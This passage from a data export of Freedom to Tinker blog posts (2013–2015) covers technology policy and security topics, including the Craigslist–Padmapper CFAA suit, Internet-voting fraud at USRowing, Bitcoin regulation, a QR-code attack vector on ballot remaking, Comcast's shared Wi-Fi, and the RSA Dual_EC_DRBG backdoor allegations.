externalities in these attacks shouldn’t be too surprising. Attackers will strike where the defenses are weakest, and defenses are often weakest where the incentive to defend is lacking. Can we eliminate these externalities? That’s not easy. For now, the main strategy is moral persuasion, asking people to tighten up their systems for the good of the community. That’s useful, but when hard choices have to be made, organizations will protect their own assets. And sometimes they won’t even know their infrastructure was involved in an attack."
"249","2013-04-30","2023-03-24","https://freedom-to-tinker.com/2013/04/30/dear-craig-voluntarily-dismiss-with-prejudice/","[Cross-posted on my blog, Managing Miracles] Last summer, Craigslist filed a federal lawsuit against the company Padmapper (and some related entities). Padmapper.com is a site that, among other things, allows users to view Craigslist postings on a geographical map. It is a business premised on providing value added services to Craigslist postings — with some of that added value going back to Craigslist in the form of more users. Craigslist did not like this, and alleged a host of claims — seventeen of them, by the time they were done with the “First Amended Complaint” (FAC). Among their claims were alleged violations of copyright, trademark, breach of contract, and — surprisingly — Computer Fraud and Abuse Act (CFAA). The CFAA claims were not in the original complaint (they showed up only in the September 2012 FAC). Today, the judge ruled that some of the claims would be dismissed, but that many would survive. I am still at a loss about why Craigslist is taking such a scorched earth tactic against a site that appears to help more people find Craigslist postings. Sure, they’re looking to make money while doing it, but that’s how much of the internet business ecosystem works. I’m particularly shocked, because Craig Newmark has been at the forefront of fighting for so much good online policy. We’ve met a few times, including the period when he was embroiled in the fight over whether or not “adult services” would do away with his CDA 230 intermediary liability. He was on the right side of SOPA/PIPA and helped to fight against over-expansive copyright. I’ve always found him to be personally friendly, thoughtful, and savvy about what makes the internet work. Craig: Why do you care if these guys scrape Craigslist? Don’t you want to see what kind of useful tools they’ll produce? I tried your own mapping function recently (which appears to be in reaction to Padmapper) and it’s not that great. You lost your primary copyright argument already in pretrial motions, but don’t you think that it’s poor form to pursue the remaining claims at trial? The internet economy has grown out of sharing information and building better tools. Instead of trying to imitate your new “competitors,” why don’t you define an API to provide them with the data in order to encourage their work? The CFAA (and state counterpart) claims are particularly distasteful and ill-advised for reasons that we all understand. You created the site to do good in the world, but this lawsuit feels like an attempt to do well. Those of you following along at home can see the full docket, as well as the “First Amended Complaint” by Craigslist, and today’s Order. You should read the EFF’s summary, Derek Khanna’s summary, and the DMLP summary. The fact pattern is a bit complex, but the 17 claims can be roughly broken down into the following: 1. Copyright Infringement, and the tort of Misappropriation 2. Trademark Infringement 3. Breach of Contract claims 4. Computer Fraud and Abuse Act, it’s California counterpart, and the tort of Trespass 5. Unfair Competition Today’s opinion does not throw out any of these claims in their entirety. The court says that, in general, Craigslist did not obtain copyright in the user postings, so it cannot enforce them. However, in a flip-flop of policy, Craigslist added on July 16 2012 a disclaimer to all new posts stating that it gained full exclusive copyright in the post contents, only to reverse that policy on August 8. The initial move was obviously in response to their concern that the copyright claim in this lawsuit would fail, and the reversal was the result of the natural response of the internet (i.e. “this is ludicrous”). That means that we have a weird situation in which user posts for a few weeks were arguably copyrighted works of Craigslist. So, the court tosses most of the copyright claims, but there are still quite a few posts in the course of that three weeks that could qualify. Craig: If you push forward on this claim based on the 3-week period during which your company imposed a draconian and universally hated term of use, you’ll look foolish and vindictive. The trademark claims seem thin as well, given that in the course of using the CRAIGSLIST mark, Padmapper stated clearly that it was not CRAIGSLIST. I don’t see any reasonable likelihood of confusion… and as for dilution, really guys? The breach of contract claims seem hard to sustain because Padmapper cannot be forcibly made party to a contract by visiting a public web site (or, at least, the Ninth Circuit generally doesn’t think so). In any case, I’m not sure what remedy comes purely out of that claim. It appears that the bulk of what remains involves whether or not Padmapper or its alleged affiliates accessed Craigslist data in an unauthorized fashion such that it would trigger the Computer Fraud and Abuse Act or the California equivalent. There are many far-reaching negative consequences, that I am sure Craig undertands intimately, to defining “unauthorized access” broadly enough to make it into a criminal claim in this case. The EFF has it right on this issue. Craig: You should be helping to reform the CFAA rather than helping to bastardize its use in the federal courts. It’s time to voluntarily dismiss the entire suit, with prejudice."
"250","2013-05-29","2023-03-24","https://freedom-to-tinker.com/2013/05/29/internet-voting-snafu-at-usrowing/","USRowing, the governing body for the sport of rowing in the U.S., recently announced the discovery of likely fraud in one of its leadership elections. Further investigation into this region’s voting resulted in the determination that fraudulent ballots were cast in the Mid-Atlantic election that directly affected the outcome of the Mid-Atlantic Regional Director of the Board of Directors election only. Those responsible for the fraudulent ballots have not yet been identified. The election was held using an Internet voting system called Votenet. Votenet promotes itself as highly secure, and the company’s website offers white papers touting security certifications from Hyperion, Interfor, SAS70, Verisign, McAfee, and TrustE. Security experts have long been skeptical of Internet voting. Although it might make sense to do online voting for some lower-stakes private elections, especially those without a secret ballot requirement, it has long been known that elections that rely only on Web or email access by voters cannot be very secure. What went wrong in the USRowing election? I couldn’t find any discussion of the incident on Votenet’s site. The best clue comes from the USRowing statement: During the initial phase of the investigation, a member of the rowing community came forward and disclosed their ability to obtain login information that allowed access to VoteNet, USRowing’s third-party online voting resource used successfully for the past four years, while appearing to be an authorized voter of a USRowing member organization. This individual also admitted to using these credentials while the election was underway to access most of the Mid-Atlantic organizations’ voting accounts on VoteNet. This appears to indicate a failure of user authentication. Somehow, it was possible to get login credentials that allowed an attacker to pass themselves off as most or all of the authorized voters. How exactly this happened is not clear, but two obvious possibilities are that a listing of login information was somehow available to would-be attackers, or that login information such as passwords were created in a way that made them guessable. With the ability to impersonate voters, someone was apparently able to cast improper votes. It’s interesting that the problem was apparently not discovered right away. One would expect that if an attacker cast a bogus ballot on behalf of a voter, there would be some chance that that voter would later log on and attempt to vote, only to discover that the system thought their vote was already recorded. It’s also notable that USRowing seems to know which ballots were fraudulent. They don’t know who is responsible for casting the fraudulent ballots, so this knowledge can’t have come from the perpetrator. And notice that although USRowing says it knows of an individual who used others’ voting credentials during the election (see second quote above), but they don’t know who cast the fraudulent ballots (see first quote above)—which can only mean that the fraudulent voter was not the only one who knew of the security problem. All of this has to be embarrassing for Votenet. It could be that Votenet’s internal security is excellent and that all of their certifications are entirely valid—but as the USRowing example shows, this by itself is not enough to make an election secure. Maybe the problem was entirely due to USRowing’s error. But even if that’s true, if you’re in the business of providing secure elections, your customers will want you to do what is necessary to provide secure elections."
"251","2013-06-28","2023-03-24","https://freedom-to-tinker.com/2013/06/28/regulating-bitcoin/","On Tuesday the State of California sent a letter to the Bitcoin Foundation, saying that the Foundation might be in violation of California’s law against running an unregistered money transmission business. The letter isn’t important in the grand scheme of things—it’s clear that the Bitcoin Foundation isn’t transmitting money—but it does raise the obvious question of how governments will try to regulate the use of Bitcoin. Obviously, regulating Bitcoin itself is different from regulating specific companies that happen to use Bitcoin. As an example, Mt. Gox, the best-known Bitcoin exchange, is a Japanese company that does business in the U.S. (among other places). Mt. Gox is subject to Japanese laws regarding corporations generally as well as its specific business, and to the extent it does business in the U.S. it is subject to U.S. law. For example, FinCEN (the part of the U.S. Dept. of Treasury that enforces laws relating to money laundering) has insisted that Mt. Gox report financial transactions in the same way that other institutions would. It seems like common sense to apply these laws evenhandedly to Bitcoin and non-Bitcoin transactors. Exactly how to fairly apply business laws and regulations to companies that use Bitcoin is an interesting question; but whether governments should enforce these laws against individual companies that use Bitcoin should be an easy question. The most interesting questions arise when a government wants to regulate the overall Bitcoin system. Contrary to some punditry, there is no simple argument that Bitcoin is unregulable. As I explained in my previous post on governance in Bitcoin, the rules of Bitcoin can change and have changed, and there is an emerging though informal governance structure for Bitcoin, which coincides with the governance of the open-source Bitcoin reference software by the software’s lead developers. The people who govern Bitcoin are an obvious point of leverage for regulators. In principle, a regulator might try to compel the developers who govern the Bitcoin software to deploy certain rule changes, by compelling them to push software changes that implement the modified rules. But there are limits to the power of this regulatory approach, due to the limited power of the developers who govern the Bitcoin reference software. The developers can push any software change they want, but they cannot force users to adopt the modified software. If the developers make a change that the community of users rejects, then the community can fork the software: they can create their own version that does not incorporate the unwanted changes, and they can switch to using the new version. In effect, this kind of fork amounts to the community firing the administrators of the software and appointing new ones. Importantly, this kind of decision would be made by a consensus of the community, with each member’s influence ultimately determined by their importance in the Bitcoin economy, in the sense that a fork will succeed if it is is followed by a large enough fraction of the mining and transaction activity of Bitcoin. Because of this, the leverage of a regulator will depend on how centralized the Bitcoin economy becomes. If a lot of mining activity is controlled by a few entities, or if a lot of transactions are mediated by a few exchanges, then those few miners and exchanges will be points of leverage for a regulator who wants to change the rules. On the other hand, if activity is more dispersed, then regulators will have more trouble nudging the system in the direction they want. Just like the Internet itself, which was once thought (by some) to be unregulable but is now influenced strongly by various governments, Bitcoin will turn out to be more regulable than its initial advocates thought. Also like the Internet, Bitcoin will flummox some of the less savvy people in government, leading to some series-of-tubes moments. Bitcoin, like the Internet, is a new kind of thing, and governments will find new ways to influence it."
"252","2013-07-19","2023-03-24","https://freedom-to-tinker.com/2013/07/19/google-glass-vuln-in-qr-codes-and-ballot-marking-applications/","Reading recently about a vulnerability in Google Glass that can be exploited if a victim takes a picture of a malicious QR code made me think about one of the current trends in absentee balloting. A number of localities in the US are trying out absentee ballot schemes where a voter goes to a website and makes his/her choices through a web form, then prints out a ballot that contains his/her choices as a marked ballot plus a barcode (typically a 2D QR code). The ballot is then mailed back to the locality with whatever signature forms are required. When the ballot arrives at the locality, election officials scan the QR code to duplicate the ballot showing the voter’s choices, (hopefully) compare that the voter selections actually match the marks, and then the ballot goes forward. (Commercial products with this feature include Everyone Counts and Scytl.) The motivation for this process, usually called “ballot duplication” or “ballot remaking”, is that automatic scanning can be difficult due to discrepancies in the printing process on individual printers, or damage to the paper during printing mailing. This process has existed for many years without the QR code – if you hand-mark an absentee ballot, and it gets bent or wet (or has coffee stains!), then the election office will remake it simply by hand-copying your choices onto a fresh ballot, and marking the old one so it doesn’t get counted twice. (I believe that localities will put a serial number on both the original and remarked ballot, just to be sure they know which remarked ballot came from which original, but without any indication of whose ballot it is.) There’s a number of recognized risks in these automatic remaking systems, including (1) the voter is coerced when they fill out the web form, (2) the ballot marking software doesn’t correctly record the voter’s intent in the barcode and the cross-checking isn’t done so the discrepancy is noted, (3) malware on the voter’s computer causes it to generate the wrong ballot and barcode, (4) the duplication process works incorrectly and it isn’t noticed, (5) the voter hand-marks something after printing the ballot and that’s not noticed in the cross-check, etc. One that I’ve wondered about, but haven’t seen discussed is the risk of the QR code being malicious. So I found the Google Glass vulnerability very interesting – basically, until Google fixed this bug, if an attacker could get a Google Glass wearer to take a picture of a QR code, they could install malware in the Google Glass device. This is exactly the same issue as getting an election office to take a picture of the QR code on a ballot (which would be a normal part of ballot processing) – is it possible for a voter to install malware into the ballot processing system by sending a deliberately malformed QR code? Clearly this isn’t going to be easy – the voter would need to have some clue what software is being used for the QR processing, and would have to find a vulnerability in it. Assuming the attacker doesn’t have a copy of the setup as used by the election officials for processing ballots, testing would be difficult, since it’s highly non-interactive (the attacker mails in his/her ballot with the malformed QR code, and then has to observe the election results to see if their attack worked). [By contrast, say, to a website where even if the attacker doesn’t have a copy of the software, s/he can test it and see how it react to a stimulus.] Assuming that this vulnerability exists in a voting system, it’s not too hard to deal with – some level of comparing the mailed-in ballot to the duplicated ballot would detect mismatches, and if the level is too high, then the duplicated ballots could be assumed to be wrong. Of course this assumes the ballot duplication system is standalone and not used for other purposes – if it were networked, then an attack launched in this way might spread to other computers where it might have more observable activities. But if election officials aren’t aware of the risk, they may not go to the extra step (and expense) of checking the duplicated ballots and/or isolating the ballot duplication system from their network. The bottom line is that anywhere an attacker can provide input into a computer system, it’s a part of the attack surface. Ignoring an attack surface, even one as simple as a QR code, is at the system owner’s peril. Although it’s a long shot, it’s still an interesting attack vector – one I had hypothesized, and having seen this attack, believe is somewhat more likely to be possible. And for amusement, it’s related to the Bobby Tables attack in Sweden, which is nicely written up here and summarized by Bruce Schneier."
"253","2013-08-24","2023-03-24","https://freedom-to-tinker.com/2013/08/24/annual-report-of-fccs-open-internet-advisory-committee/","For the past year, I’ve been serving on the FCC’s Open Internet Advisory Committee (OIAC), and chairing its mobile broadband working group. The OIAC just completed its first annual report (available here). The report gives an overview of the past year of work from four working groups (economic impacts, mobile broadband, specialized services, and transparency). I highly recommend anyone interested in Open Internet issues take a look. In the mobile broadband group, we took on two main tasks: – AT&T/FaceTime Case Study: Last fall, we did a case study of a timely topic — AT&T limiting usage of Apple’s popular FaceTime video chat application on its cellular network (available here). The case study includes a history of the controversy, an analysis of the key issues (i.e., FaceTime as a preloaded app, the high bandwidth requirements, the carrier’s desire for a phased roll-out, and whether blocking takes place on the user device vs. inside the network). The report ends with three different opinions on whether restricting FaceTime usage on AT&T’s network constituted an inappropriate form of “blocking”, or a reasonable network-management practice. – Openness in the Mobile Broadband Ecosystem: This spring, we stepped back and did a fairly broad analysis of the state of the mobile broadband ecosystem, considering the influence many different parties (carriers, device and OS manufacturers, application developers, and network equipment vendors) have on openness for mobile broadband users (available here). Folks interested in understanding the mobile broadband landscape, and the sometimes tense interactions between different players, may find this report a useful way to “get up to speed.” The report includes case studies on the role of App Stores, service agreements between carriers and consumers, the influence of applications that make aggressive use of network resources, and the impact of WiFi offloading. In the coming weeks, we’ll be considering what topics to investigate during the year ahead. Comments definitely welcome!"
"254","2015-01-17","2023-03-24","https://freedom-to-tinker.com/2015/01/17/shaping-wi-fis-future-the-wireless-mobile-convergence/","According to recent news, Comcast is being sued because it is taking advantage of users’ resources to build up its own nationwide Wi-Fi network. Since mid-2013 the company has been updating consumers’ routers by installing new firmware that makes the router partially devoted to the “home-user” network and partially devoted to the “mobile-user” network (a Comcast service named Xfinity WiFi). In fact, the same network infrastructure offers two different kinds of connection: the first one covers a comparatively restricted (local) area and stays under the relative control of the private end-user; the second kind of connection is “shared” between Comcast customers and covers a wider area, compatible with the range of national mobile carriers. In other words: the last mile of data transmission is being made mostly by a group of home based routers (or access points) that offers two different Internet connection services, the local “private” network and the metropolitan “shared” network. Integrating several wireless Internet access points into a seamless shared network isn’t new technology. Lots of Wireless Community Networks (WCNs) have been doing that in a collaborative and non-profit fashion by using Wi-Fi and Mesh technologies. De Filippi and Tréguer (2015) teach us about the citizen-centric value of these communities and, more than that, about the political struggle they’re facing to produce relative autonomy against commercial Internet Service Providers (ISPs). There are many examples of WCNs in which there are no clear boundaries between Internet users and providers or between users’ equipment and network infrastructure, configured in a peer-to-peer-like architecture. This operation mode is legitimated by the community-driven approach once the network is deployed by and for the community; the network infrastructure is understood and managed as commons. On the other hand, the picture drastically changes once a huge corporation like Comcast starts blurring the user-provider boundary by default and, apparently, without properly informing its customers. At the end of the day the lawsuit against Comcast represents a dispute that is related to the ownership and control over a specific slice of the data transfer infrastructure. With the risk of oversimplifying, we may say that the question is: who’s the owner and the controller of the wireless router? Cutting the Network Anthropology can teach us that ownership and property relations are absolutely decisive in Cutting the Network (Strathern, 1996). Property relations very often are the responsible for establishing the limits of a network; Strathern argues, for instance, that intellectual property rights cut down large knowledge networks. Here, specifically in regard to the XFinity WiFi case, the connection between ownership and the network’s range is quite literal: the “new network” did not affect Comcast customers who use their own wireless routers at home. Comcast has extended its Wi-Fi network using only the wireless routers that the company leases to its customers. It seems that the company considers it fair to take advantage of its own infrastructure even when it is placed into customers’ houses. However, the plaintiffs in the lawsuit raise interesting concerns by arguing, for example, that the vagueness of the contract of service does not allow one to say for sure whether Comcast is allowed to do that. The formal claim also highlights the fact that Comcast is making extra profit by sharing the costs of extending its own Wi-Fi hotspot network with a group of customers. To give a very concrete argument: the new “shared” network raises router power consumption, and Comcast customers are paying the bill. Besides, there are consumers claiming that the quality of service of the home-user (or “private”) network is getting worse since the bandwidth dedicated to each home-based access point is now being shared with other users. Finally, there are critical security issues since the “public” connection to the wireless router might represent a threat to the home-network privacy. Dissatisfied consumers have tried to disable the “public” network with no success. There’s a long discussion on the case in the social network Reddit; a top comment reads: [Comcast’s] website says this to turn it off: We encourage all subscribers to keep this feature enabled as it allows more people to enjoy the benefits of XFINITY WiFi, but you will always have the ability to disable the XFINITY WiFi feature on your Wireless Gateway. Visit My Account at https://customer.comcast.com/, click on “Users & Preferences” and then select “Manage XFINITY WiFi” or call 1-800-XFINITY. To which you’ll get a message: We’re sorry. Something unexpected happened. Please try again later And then you’ll call Comcast. Their techs will try to talk you into changing your mind, say they disabled it, but you check later and they didn’t. This is not the only report from Comcast customers saying that they have followed all required steps to disable the “public” network but it did not work out. In face of this situation, another comment argues that the only ultimate solution is replacing Comcast’s wireless router with a private one, so that the end-user can control the device’s setup. The ownership over a strategic component of the network infrastructure, the wireless router, apparently assures relative autonomy to the end-user, at least to avoid broadcasting the additional “shared” network. The lawsuit is a formal way of concretizing the conflict over the ownership and the boundaries of Internet network infrastructure. In fact, the formal complaint against the cable operator Comcast is just a facet of a much wider conflict: Comcast is stepping in the mobile broadband market and directly competing with cellular network operators. Coming from other direction, mobile carriers are adopting Wi-Fi as complementary solution to cellular networks. In short, ISPs and mobile carriers (among others market players, such as equipment manufacturers) are competing and cooperating to define the technological standards and the business model that will rule the mobile broadband market. Wi-Fi’s next generation: 802.11ax – High Efficiency Wireless LAN. I recently learned that the Wi-Fi’s next generation (IEEE802.11ax) is being designed to increase the level of integration and synergy with cellular networks, especially in regard to the LTE (4G) network. I was advised about that while doing fieldwork research within a standards development organization (SDO), the IEEE-SA. The movement of cellular network operators towards Wi-Fi technology is quite easy to understand once one considers at least two facts: first, Wi-Fi works on unlicensed bands which are free of charge – it’s largely known that mobile carriers normally spend billions of dollars in spectrum auctions for licensed bands. The second fact is that 4G/LTE networks do not work properly in areas with a high density of users. Despite the advances in relation to 3G systems, 4G/LTE network does not provide enough throughput capacity to satisfy the always increasing user demand. Mobile carriers already make use of Wi-Fi hotspots to offload traffic from cellular networks. But, Wi-Fi technology wasn’t initially designed for this purpose and also fails to work properly in the dense area situation. That’s why some network operators (especially Orange and China Mobile) have advocated for the IEEE802 group (responsible for developing Wi-Fi standards) to propose the High Efficiency Wireless LAN (HEW) project. To put it simply, we may say that carrier’s approach to 802.11 was something like that: hey, why don’t you make 802.11 look more like LTE? Carriers were complaining about 802.11’s performance in dense environments and requiring changes and new features that turn Wi-Fi very close to Wireless Advanced standards (4G requirements as defined by ITU). Carriers are also concerned with producing handover mechanisms between Wi-Fi and LTE (4G) networks; those mechanisms must help switch the user’s connection between networks by defining which connection to choose and how long to maintain the connection. Initially, carriers’ requirements were too broad and it took about a year to narrow down the scope and write the HEW project. The project ended up focusing on solving the dense environments situation and increasing the throughput capacity. One must keep in mind that IEEE802.11 is the Working Group (WG) responsible for writing Wi-Fi’s standards for MAC and PHY layers. Along with IEEE802 there are other entities (like IETF, 3GPP, WBA and Wi-Fi Alliance) writing pieces of the ultimate solution that will integrate Wi-Fi and cellular networks; 3GPP, for instance, is writing down the handover mechanisms and, at the same time, has proposed developing its own network standard working on unlicensed spectrum, the LTE-U. The technopolitics of wireless-mobile convergence. The mobile telephony business has evolved into the mobile broadband business; as cause and consequence cellular networks are converging with broadband networks. The only two existing cellular 4G standards (LTE-Advanced and Wireless MAN-Advanced) are all IP systems. Wireless and mobile both designate that the end user’s connection to the network is made through an air interface. However, the prime difference is that the former was created within the computer networks evolution while the latter comes from cellular telephony networks. This convergence process is not new but, from now on, the merge between wireless and mobile must become an object of public attention. It’s an important technopolitical issue for at least two good reasons. First, carriers are going to monetize the unlicensed spectrum that is widely understood as a common and shared resource. The intensive use of that spectrum’s share might interfere negatively with the functioning of other technologies that coexist in it. Engineers and policy makers should take that into account, especially having in mind that the unlicensed spectrum has a truly public dimension and must support the simultaneous working of distinct technologies. Second, mobile carriers are used to exercising a high degree of control and concentrated power. The cellular architecture is designed in a way that the service provider has “absolute” control over the network infrastructure including users’ devices. At the cellular network management level, identifying and localizing each device is essential, for example, to decrease signal interference, to apply billing methods and to maintain an expected level of quality of service. The same does not happen with Wi-Fi network architecture. In addition, carriers are used to exerting dominance over the whole market since they’ve paid a lot of money for a licensed share of the spectrum; they exercise great influence over device manufactures by approving (or not) the equipment to work on that spectrum band, or even by telling the manufactures what chip they can put into the device. As soon as carriers are moving into a position in which they have paid nothing for the spectrum, the picture changes and they can’t have the same degree of control, since other people are allowed to deploy technology operating at that band. The simultaneous working of two technologies in the same spectrum share might be harmful to both of them; for instance, they might simultaneously cancel each other’s signal. To finish up this post, let’s go back to the beginning: the lawsuit claims that Comcast is practicing unfair competition by deploying a nationwide wireless/mobile network based on a pre-existing infrastructure and end-users’ resources. Comcast is trying one way to navigate the crossroad that puts together ISPs and cellular operators. We’re in the early stage of a huge competition to achieve dominance and control over the mobile broadband market. The hybrid architecture mixing Wi-Fi, cellular, and other upcoming technologies is still being shaped, and there are many questions to be answered about its mode of operation and topology. Mobile carriers will try to impose their centralized approach over the upcoming network infrastructure, including Wi-Fi and unlicensed spectrum. Regulators, academics, and policymakers must pay attention to protect public interests during this upheaval in the market."
"255","2013-09-16","2023-03-24","https://freedom-to-tinker.com/2013/09/16/software-transparency/","Thanks to the recent NSA leaks, people are more worried than ever that their software might have backdoors. If you don’t believe that the software vendor can resist a backdoor request, the onus is on you to look for a backdoor. What you want is software transparency. Transparency of this type is a much-touted advantage of open source software, so it’s natural to expect that the rise of backdoor fears will boost the popularity of open source code. Many open source projects are fully transparent: not only is the source code public, but the project also makes public the issue tracker that is used to manage known defects and the internal email discussions of the development team. All of these are useful in deterring backdoor attempts. This kind of transparency often goes together with permissive licenses that allow users to redistribute the code and to modify it and distribute the modified version. That’s the norm in popular open source projects. But it’s possible in principle for a project to be transparent—making code, issue tracking, and design discussions public—while distributing the resulting code under a license that bans modification or redistribution. Such a product would be transparent but would not be free/open source. Of course, having everything public does not ensure that there are no holes. The Debian project, which is transparent, had a serious security hole in its pseudorandom generator for several years. Transparency makes holes detectable but it doesn’t guarantee that they will be detected. There’s a well-known saying in the open-source world, which Eric Raymond dubbed Linus’s Law: “given enough eyeballs, all bugs are shallow.” The idea is that the key to finding and fixing bugs effectively is to have many people looking at the code—even a bug that is hard for most people to detect will be obvious to a few. But transparency does not guarantee that holes will be found, because there might not be enough eyeballs on the code. For open source projects, finding backdoors, or security vulnerabilities in general, is a public good, in the economists’ sense that effort spent on it benefits everyone, including those who don’t contribute any effort themselves. So it’s not obvious in advance that any particular open source project can avoid backdoors. Even if there are enough eyes to rule out backdoors in the source code, you’re still not in the clear. Your system doesn’t run source code directly—it must be translated into machine code first. How can you be sure that the machine code running on your machine is really equivalent to the source code that was vetted? This is a famously difficult problem, and the subject of Ken Thompson’s famous Turing Award lecture, Reflections on Trusting Trust. There is no simple solution to this object code vs. source code problem. Transparency is never easy. But in today’s world it is more important than ever."
"256","2013-10-30","2023-03-24","https://freedom-to-tinker.com/2013/10/30/the-2008-liberty-case-an-authoritive-ruling-on-snowdens-disclosures/","The other day, I was re-reading the 2008 Liberty vs. The United Kingdom ruling of the European Court of Human Rights (‘ECHR’). The case reads like any BREAKING / REVEALED news report on Edward Snowden’s disclosures, and will play a crucial role in the currently pending court cases in Europe on the legality of the surveillance programs. Liberty is also great material for comparing surveillance jurisprudence across the Atlantic. They did not like what they saw on the telly in 1999. A TV show reported on the UK Ministry of Defence operated Electronic Test Facility (“ETF”) at Capenhurst in Cheshire. Soon afterwards, Liberty, the Irish Council for Civil Liberties and several other British NGOs launched a case against the UK government. The NGOs had provided legal advice throughout the UK during the 1990s and had legitimate concerns to be victims of the reported systematic mass surveillance of all telecommunications across the British isles. After going upstream through several legal procedures, the ECHR released its final ruling in August 2008. Allow me to cherrypick from the Court’s assessment, in particular §64-§66: the 1985 Act [on which the UK government based its surveillance program] allowed the executive an extremely broad discretion … virtually unfettered; for example, all commercial submarine cables having one terminal in the UK and carrying external commercial communications to Europe; Information could be … listened to or read, if the Secretary of State considered this was required in the interests of national security, the prevention of serious crime or the protection of the United Kingdom’s economy; material was selected for examination by an electronic search engine, and search terms, falling within the broad categories covered by the [surveillance order] certificates, were selected and operated by officials. The ruling has lots and lots of interesting observations, but these cherries square quite nicely with the Guardian reports on Snowden’s GCHQ disclosures on the TEMPORA program, as well as disclosures about xKeyscore, the mapping of a social graph of every internet user and the unfettered character of intelligence surveillance legal framework in general. Since the first Snowden revelations, several cases have been launched — among them a fresh Liberty complaint and one by a second group of NGOs. When those cases end up upstream with the ECHR, and the NGOs have already committed to go all the way, Liberty will play a huge role in the Court’s assessment. So what was the outcome in 2008? The short version: the Court struck the surveillance practises down for not being ‘in accordance with the law’. In other words, the legislation on which the British Government based its untargeted surveillance was so vague and ambiguous, that it didn’t meet the procedural requirements for surveillance laws under the European Convention of Human Rights – thus a violation of Liberty’s privacy rights. Failing to meet the first procedural test, the Court was able to avoid the third, and politically much more sensitive, substantive test: was the 1990s ETF program ‘necessary in a democratic society?’ Given the sustained ambiguity in UK surveillance laws today, the Court just might be able to dance around the substantive assessment next time around. A likely outcome of such a case will be a legal necessity for meaningful oversight as well restraints on mass surveillance for Council of Europe member states with regard to their citizens. Practically, if you think about it from a strategic game theory perspective, stronger domestic legal protection might just further fuel what you’ll read about today in the news and what we’ve argued last year in our paper ‘Obscured by Clouds’ (§2.2.3.): the circumvention of local laws through transnational surveillance followed by bilateral intelligence sharing, or ‘I spy from my country on your citizens, you from yours on my citizens, and we share the data through secret agreements’. That’s a difficult problem to solve under existing laws, unless we all agree about our universal commitment to the UN charter of human rights. Now there’s a political challenge. A final thought: at least since 1978 (Klass v. Germany), the ‘mere existence’ of vague surveillance laws is an actual harm, a violation of privacy. And for very good reasons, among them knowing what your government is up to and being able to protect senstive communications – such as NGOs providing legal advice to citizens. The US Supreme Court has taken a quite different approach a range of opinions, such as the February 2013 case of Clapper v. Amnesty [pdf]: no standing for Amnesty, the ACLU and other NGOs, as they couldn’t prove that they had been a subject of surveillance. Cunningly, meaningful transparency is just the sort of thing the Patriot Act and even more so the Foreign Intelligence Surveillance Act succeeds in obscuring. A rather Orwellian twist in the Supreme Court case-law and the US legal framework. The mere existence of vague surveillance laws is dangerous in itself. Post-Snowden, one would hope that the Supreme Court catches on, in stead of moonwalking out of NGOs challenging government surveillance."
"257","2013-11-29","2023-03-24","https://freedom-to-tinker.com/2013/11/29/bitcoin-research-in-princeton-cs/","Continuing our post series on ongoing research in computer security and privacy here at Princeton, today I’d like to survey some of our research on Bitcoin. Bitcoin is hot right now because of the recent run-up in its value. At the same time, Bitcoin is a fascinating example of how technology, economics, and social interactions fit together to create something of value. Our Bitcoin work started with a paper by Josh Kroll, Ian Davey and me, about the dynamics and stability of the Bitcoin mining mechanism. There was a folk theorem that the Bitcoin system was stable, in the sense that if everyone acted according to their incentives, the inevitable result would be that everyone followed the rules of Bitcoin as written. We showed that this is not the case, that there are infinitely many outcomes that are stable yet differ from the written rules of Bitcoin. So the rule-following behavior that we currently see is at best stable in the weaker sense that if everyone else is following the rules (and no one mining entity has too much power) then deviating from the rules will cost you money. Beyond this, we have built a better understanding of the “political economy” of Bitcoin—how the Bitcoin community governs itself to keep the system operating well, despite the lack of a central authority and despite the complicated issues around the theoretical stability of the protocol. The ultimate goal of this line of work is to understand how Bitcoin is likely to deal with challenges in the future, and whether there are feasible changes that could improve the governance of Bitcoin. Since then, we have started several more Bitcoin-related projects. My faculty colleague Arvind Narayanan (who joined us last year) as well as several more students are working on Bitcoin, and the pace has accelerated. We’re building tools to track and diagnose the behavior of the peer-to-peer network that Bitcoin participants use to spread information about what is happening. We’re looking at the dynamics of mining pools, in which a group of miners cooperate to spread the risk inherent in the mining process. We’re considering new types of double-spending attacks and how participants can defend against them. Let me highlight one current project: we’re designing a decentralized prediction market using the Bitcoin protocol. Prediction markets enable participants to trade “shares” on potentially any event with well-defined outcomes, such as a presidential election or sporting events. The market prices of these shares can be interpreted as the probability of the event occurring. Prediction markets offer societal benefits because of this ability to accurately aggregate the wisdom of crowds. Decentralization can improve prediction markets in various ways including robustness to closure (see Intrade), greater expressivity in defining markets and outcomes, and potentially lower fees leading to more accuracy in pricing unlikely events. There are two main difficulties: first, how can a pair of anonymous participants trade shares without a trusted party to facilitate the transaction? Second, who will arbitrate the outcome of events? This is far trickier than it sounds—even for outcomes that are completely uncontroversial, some entity or group of entities must be entrusted with the authority to declare the outcome, and there must be checks to prevent them from abusing their power. It turns out that the contract-signing capability and the consensus mechanism of Bitcoin or a Bitcoin-like system enable us to find solutions to these problems, and that is the crux of our research. This is a collaboration between Princeton researchers and soon-to-be-CITP-fellow Joseph Bonneau, Jeremy Clark at Concordia, and Andrew Miller at UMD. The analogy is often made that Bitcoin will do to money what the Internet did to communications. If that is the case, many, many interesting and useful designs that use Bitcoin as an underlying protocol are waiting to be discovered. It’s an exciting time to be doing research in this area."
"258","2013-12-23","2023-03-24","https://freedom-to-tinker.com/2013/12/23/rsa-doesnt-quite-deny-undermining-customers-crypto/","Reuters reported on Saturday that the NSA had secretly paid RSA Data Security $10 million to make a certain flawed algorithm the default in RSA’s BSAFE crypto toolkit, which many companies relied on. RSA issued a vehement but artfully worded quasi-denial. Let’s look at the story, and RSA’s denial. The story relates to a much-discussed NIST standard for cryptographic pseudorandom number generation—a critical component of every crypto implementation. The NIST standard offered several core algorithms to choose from, including one called Dual_EC_DRBG that is based on elliptic curves. As I described in a previous post, Dual_EC_DRBG has been suspected since 2007 of having a backdoor that would let the NSA recover the secret keys of people who used it. Given what we know today, it seems fairly certain that the NSA backdoor does exist. According to Reuters, NSA secretly paid RSA $10 million to make the Dual_EC_DRBG algorithm the default in RSA’s widely used BSAFE crypto toolkit. Only after NIST recalled the standard in September 2013 did RSA stop shipping the backdoored algorithm as a default. With that context, let’s look at RSA’s denial: Recent press coverage has asserted that RSA entered into a “secret contract” with the NSA to incorporate a known flawed random number generator into its BSAFE encryption libraries. We categorically deny this allegation. We have worked with the NSA, both as a vendor and an active member of the security community. We have never kept this relationship a secret and in fact have openly publicized it. Our explicit goal has always been to strengthen commercial and government security. Key points about our use of Dual EC DRBG in BSAFE are as follows: We made the decision to use Dual EC DRBG as the default in BSAFE toolkits in 2004, in the context of an industry-wide effort to develop newer, stronger methods of 